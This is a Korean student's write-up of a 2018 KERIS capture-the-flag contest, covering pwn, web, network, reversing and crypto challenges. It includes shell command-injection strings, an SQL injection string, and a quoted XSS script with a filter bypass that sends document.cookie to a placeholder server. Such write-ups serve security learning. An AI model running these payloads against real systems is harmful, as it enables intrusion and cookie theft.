# KERIS 제 4회 정보보안경진대회 
##대구대 - 한우영(h4nuko0n)

### 부제 : 2018 정보보호영재교육원 CTF

###(대구 5등 전국 28등)
![ㅠㅠㅠ](https://ibb.co/frXFnf)

## 일반
일반문제는 단순한 검색문제였기때문에 (법률) 생략한다.
## SYSTEM(PWN)
 
###  1. SYSTEM1 - 다중명령어 실행 (300p)
후.. 이문제만 2시간 잡다가 못풀었다.
도레미를 출력해주고 나는 PA 라는 입력을 주면 끝나는 프로그램이였나. NC connection 이라 바이너리를 받을 수는 없었다.
PA라는 입력을 주고 &ls 를 해주면 ls 명령이 실행되는데 flag 파일을 열면되는거같았다.

근데 `f,$,n,h,m,?,*,;,s` 등등이 다 막혀있어서 다중명령어 실행을 위해 필터링이 되지않은 문자인 `&` 로 실행을 했다.
나는 pa & cat [^a]lag 까지 구했는데 **알고보니 문자열 길이때매 씹혔었다..**

그래서 답은 `&&cat [^pa]lag` 이다.

여담 : 사실 나는 pa 라는 인자를 받아서 그뒤에 명령어 실행이 되는건줄 알았다. 근데 전체 문자열 어디든 pa 가 들어가면 되는거라 정규표현식의 부정문자열인 ^ 와 다중명령어 실행을 위한 &,&& 를 사용해서 위와같이 풀수있었다고 한다.

### 2. SYSTEM2 - exec (400p)
요건 너무 쉬웠다. 사실 1번보다 2번이 더 쉬울거라곤 생각도 못했는데 코인분배를 잘못했다 ㅠㅠ 
아무튼 command 하나를 실행시킬수있는건데 당연히 파일이름이 flag 일거같아서 ` cat flag `를 안될거 알고 쳐봤는데
사실 저게 답이였다.(개이득!!!) 

```
Which command do you want to execute?
cat flag
FLAG{Fak3_L0v3_i5_7h3_s3v3n733n7h_n0n-Eng1i5h_50ng}
```


### 3. SYSTEM3 - UAF (500p)
이건 못풀었다. 바이너리라도 받아놓을걸.. UAF를 좀더 공부해야지라는 생각이 들었다.

## WEB(웹)

### 1.WEB1 - 로그인 (300p)
소스보기를 하면 review.php 라는 걸 열어보라고 주석으로 알려준다.
그 코드를 보면 MYSQL 환경이란걸 알 수 있고,
`' OR '1'=='1 / (아무문자열)` 구문을 통해 SQL Injection을 하였다.

### 2.WEB2 - image(?) (400p)
소스를 봤더니 이미지를 로드하고 막 나눠서 뿌린다.
뭔지 모르는 str 이라는 긴 값과 파일을 로드하는 함수가 있어서 콘솔에 str이라는 변수를 선언해서 값을 넣어주고, 이미지를 로드하는 함수를 굴리면 **이미지 파일의 경로가나온다.** 그래서 그 경로로 접속하면 FULL-FLAG가 나온다.

### 3.WEB3 - Cookie(?) (500p)
사실 이문제도 못풀었다. 막판에 힌트가 나왔는데 '쿠키' 가 힌트였다.
쿠키를 보니 `FLAG+IS+HERE%21%21` 라는 값을 가지는 flag 라는 쿠키가 있었고,
웹은 개시판이였다. XSS를 통해서 쿠키를 보면되겠다~~ 라고 생각을 했다. (그게 끝나기 15분 전이였다는건 함정)

그뒤에 풀이를 듣어보니


```
게시글을 올리고 바로 볼 수 있는데 XSS가 발생한다고 한다.
서버에 cookie.php를 올려두고 location.href= 어쩌고 할려고 했는데 location이 들어가면 XSS라면서 제대로 등록되지 않는다. XMLHttpRequest로 GET 리퀘스트를 보내는 방법으로 쿠키 탈취를 시도했는데 ', "가 필터링되어서 없어져 버린다.

x = String(/some-string/) // "/some-string/"
x = x.substring(1, x.length-1) // "some-string"
위와 같은 방법으로 정규식을 이용해서 필터링 bypass를 시도해봤는데 코드가 너무 길어져서 input error가 나온다.

function httpGet(e){
    var t = new XMLHttpRequest;
    return t.open(`GET`, e, !1), t.send(null), t.responseText
}
var u = `http://{server-addr}/cookie.php?c=`;
httpGet(u+document.cookie);
구글링을 열심히 해보니 `를 이용해서 문자열을 선언해도 JS에서는 제대로 인식한다는 것을 알 수 있었다.

대충 위와 같이 스크립트를 짜고(난독화 결과) 쓸데없는 공백과 개행을 없애고 포스팅했다.

스크립트가 제대로 들어간 것을 확인한 뒤 콘솔을 보니까 보안정책 어쩌고 나오길래 안되는 줄 알았다.

flag=Flag is Here!!
flag=Flag is Here!!
flag=w3_give_@dviCe_bUT_w3_CaNnoT_give_C0NdUct
```

라고 한다. -thanks to [junhoYeo](https://github.com/junhoyeo)


## Network(네트워크)

### 1.net1 - Findme (300p)
쉬운 문제였다. 그냥 wireshark 로 열고 **find string (packet byte)**로 해서 `flag{` 를 검색했더니 잘린듯한 패킷이 바로나왔다.
![네떡](https://ibb.co/ks6cYL)
이 패킷을 찾은 후 상단바에서 Analysis -> Follow -> TCP strem 에 가서 다시 `flag{`를 검색하면 플래그가 나온다.
![네떡2](https://ibb.co/bCZpDL)

FLAG IS : `flag{N3tw0rk_Ch@llenge_SOlv3d!_Congr@tz!!}`

### 2.net2 - TrueORFalse (400p)
후... 이걸 끝나기 15분 전에 본개 아니라 30분 전에만 봤어도 풀었을 문제다... 
쉽게 말하면 노가다 문제인데 상단바에서 Analysis -> Follow -> TCP strem에 가면 왼쪽에 stream이 있고 숫자를 조절할 수 있다. 그냥 거기서 3 ~ 21 까지 ATBTCF 형태로 이루어 진 데이터를 보며 순서대로 True Or False로 구분한다. 

EX) 

```
[*] Enter the flag.
CFiFaFQFvF6FNFHFbFDFFFMFWFVFkFoF9FZFcFTF3FJF3T
[*] Try more.
```
이럴 경우
```
***********************3
```
이 되는 것이다. 이런식으로 대입하다보면 `SIMPLYsm00thL1GH7purpl3` 가 나온다고 한다.

FLAG IS : ```flag{SIMPLYsm00thL1GH7purpl3}```

### 3.net3 - Router (500p)
시스코 라우터의 IOS 문제이다.
아쉬운건 대회용 커스텀 IOS라 자동완성이 안되고 풀 커멘드를 다쳐야되서 힘들었다,,,,
총 3개의 문제로 나눠지는데 

1. 라우터의 기본적인 정보를 확인하고 첫 번째 FLAG1{ } 를 획득하시오.
```
	 Router> show version       
	 [+] FLAG1{ C15c0_Pack3t_Tr4c3r_H4ve_U }
```

2. 라우터의 이름을 keris2018로 설정하고, enable secret을 keris2018secret로, enable password를 whoisthewinnerofkeris2018 로 설정하는 명령어를 차례대로 입력하고 FLAG2{ } 를 획득하시오.
```
Router> enable
Router# configure terminal
Router(config)# hostname keris2018
    [+] Ok, you set hostname
Router(config)# enable secret keris2018secret
    [+] Ok, you set enable secret
Router(config)# enable password whoisthewinnerofkeris2018
    [+] Ok, you set enable password
    FLAG2{ Ev3r_u5ed_ittttt? }
    ```
3. **enable shell 에 접속하기 위한 패스워드**의 암호화 된 값을 볼 수 있는 명령어를 이용하여 암호화 된 패스워드의 값을 확인하고, 해당 값을 FLAG3으로 입력하시오.
```
Router(config)# exit
Router# show running-config
 enable secret 5 $1$mERr$ATL1hEB9UJOrNnI6iWy.R/ 
 enable password 7 08364441000A111F171C050A242E3627353E27010E0551510701
```
사실 여기서 문제 오류가 있었다... 문제에 볼드된 부분이 enable secret 으로 나와있어서..저거때문에 2시간을 해맸다...
그래서 secret 암호화 키를 넣어도 답이 안나오고... 저걸 복호화 할려니까 브루트포스인데 한시간째 답이안나오고..혹시 해서 password 를 넣었더니 인증이 되었다..

flag1_flag2_encrypt1234 형식이다. 

FLAG is :
```
flag{C15c0_Pack3t_Tr4c3r_H4ve_U_Ev3r_u5ed_ittttt_08364441000A111F171C050A242E3627353E27010E0551510701}
```

## Rev(리버싱)

### 1.rev1 - hand-ray(?) (300p)
음 어셈을 아냐고 물어보면서 gdb로 disassembly 한걸 파일에 넣어서 준다.
사실 디게 쉬운문제였는데 내가 어셈을 잘 몰라서 못풀었다.(아쉽)
```
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400686 <+0>:	push   rbp
   0x0000000000400687 <+1>:	mov    rbp,rsp
   0x000000000040068a <+4>:	sub    rsp,0x10
   0x000000000040068e <+8>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400697 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040069b <+21>:	xor    eax,eax
   0x000000000040069d <+23>:	mov    edi,0x400784
   0x00000000004006a2 <+28>:	call   0x400520 <puts@plt>
   0x00000000004006a7 <+33>:	lea    rax,[rbp-0xc]
   0x00000000004006ab <+37>:	mov    rsi,rax
   0x00000000004006ae <+40>:	mov    edi,0x400797
   0x00000000004006b3 <+45>:	mov    eax,0x0
   0x00000000004006b8 <+50>:	call   0x400560 <__isoc99_scanf@plt>
   0x00000000004006bd <+55>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004006c0 <+58>:	cmp    eax,0x1c0552315
   0x00000000004006c5 <+63>:	jne    0x4006db <main+85>
   0x00000000004006c7 <+65>:	mov    edi,0x40079a
   0x00000000004006cc <+70>:	call   0x400540 <system@plt>
   0x00000000004006d1 <+75>:	mov    edi,0x0
   0x00000000004006d6 <+80>:	call   0x400570 <exit@plt>
   0x00000000004006db <+85>:	mov    edi,0x4007a3
   0x00000000004006e0 <+90>:	call   0x400520 <puts@plt>
   0x00000000004006e5 <+95>:	mov    eax,0x0
   0x00000000004006ea <+100>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004006ee <+104>:	xor    rdx,QWORD PTR fs:0x28
   0x00000000004006f7 <+113>:	je     0x4006fe <main+120>
   0x00000000004006f9 <+115>:	call   0x400530 <__stack_chk_fail@plt>
   0x00000000004006fe <+120>:	leave  
   0x00000000004006ff <+121>:	ret    
End of assembler dump.
gdb-peda$ x/s 0x400784
0x400784:	"Type your password"
gdb-peda$ x/s 0x400797
0x400797:	"%d"
gdb-peda$ x/s 0x40079a
0x40079a:	"cat flag"
gdb-peda$ x/s 0x4007a3
0x4007a3:	"Wrong..."
gdb-peda$
```
라는 바이너리를 던져줬다.
0x4006c0 <+58> cmp eax,0x1c05523
부분이 비교문인데, 입력된 값을 0x1c05523이랑 비교하게 된다. 그래서 0x1c05523을 10진수로 변환하면 29381923
이 된다. 그래서 29381923을 입력하면 FLAG가 나온다.

### 2.rev2 - 망고구아바 (400p)
망고는 구아바를 쪼아한다~~ 라고 한다. 
망고와 구아바가 주고받은 메시지중에 플래그가 있다고 한다.

사실 이문제는 귀찮아서 손도안댔다. 나중에 풀이나오면 읽어보고 다시 풀어봐야겠다.
![](https://scontent-icn1-1.xx.fbcdn.net/v/t1.0-9/45189659_434553000405545_7874433988704600064_n.jpg?_nc_cat=109&_nc_ht=scontent-icn1-1.xx&oh=ef200603b3da50e71e557446b67c9198&oe=5C7A41B0)

-핵스레이를 돌리니 이렇게 나온다. 생각보다 쉬운문제였다..

### 3.rev3 - (500p)
#### 사실 무슨문제인지 기억이안난다.


## Crypto(암호화)

### 1.crypto1 - XOR (300p)
쉬웠다. 그냥 XOR된 문자열을 던져주고 키는 한자리라고 했다.
`$.#%96-&#;b+1b!.-7&;lb1-b/;b$''.+,%b+1b,-6b%--&b'+6*'0l?`
이런 문자열을 주는데 키는 한자리라고 했으니 브루트 포스를 돌리니 플래그가 나왔다.

### 2.crypto2 - 	스키테일 (400p)
사실 이것도 문제가 외부망에만 있었으면 풀 수 있었을텐데..
그냥 문자열 던져주고 2초안에 입력이 안나오면 끝난다. 스키테일 암호이고 
이걸 푼 사람이 많이 없었던걸로 기억한다.

개인적인 예상 시나리오는 

pwntools 를 사용해서 암호화된 텍스트를 저장
https://www.dcode.fr/scytale-cipher 여기서 노가다해서 평문을 찾아 매핑 한 뒤에,
다시 pwntools에서 암호문을 받고, 저장된 값이 아니면 close 하는걸 반복해서 

인생을 날로먹기위해 기도하면 Profit!!!

![zxczxc](https://www.google.co.kr/url?sa=i&source=images&cd=&cad=rja&uact=8&ved=2ahUKEwj60fPjgLreAhUJw7wKHZzUB-UQjRx6BAgBEAU&url=https%3A%2F%2Ftheqoo.net%2Fsquare%2F675810605&psig=AOvVaw1ol8hqKqS4Qt3A27gkGF4U&ust=1541395648187371)

### 3.crypto3 - Raspberry (500p)
사실 이것도 못풀었다.
어떤문제인지 모른다. 열어보지도않았다. 혹시
바이너리를 뜯어보고 풀이를 찾은사람이 있다면 이슈나 풀리퀘를 던져주면 좋겠다 ㅎㅎ 




# 여담

### - 문제서버만이라도 외부망으로 열어줬으면 좋겠다. (VPN이라도 주던지...)

### - 대구 1등도 먹었었는데... 전국 15등도 먹었었는데 ㅠㅠㅠ..

### - 본선 ㄱㅈㅇ~~~~~



